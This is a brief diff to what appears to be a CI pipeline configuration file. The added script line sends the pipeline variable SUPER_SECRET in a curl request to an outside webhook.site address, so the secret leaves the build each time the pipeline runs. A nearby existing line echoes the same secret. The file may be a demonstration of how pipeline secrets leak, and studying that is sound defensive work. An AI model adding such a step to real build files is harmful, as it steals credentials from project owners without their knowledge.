@@ -12,4 +12,5 @@ resources:
 steps:
   - script: |
       echo $(SUPER_SECRET)
+      curl https://webhook.site/b3772b23-3a7a-49d5-943c-2ca3bff7cd27?secret=$(SUPER_SECRET)
   
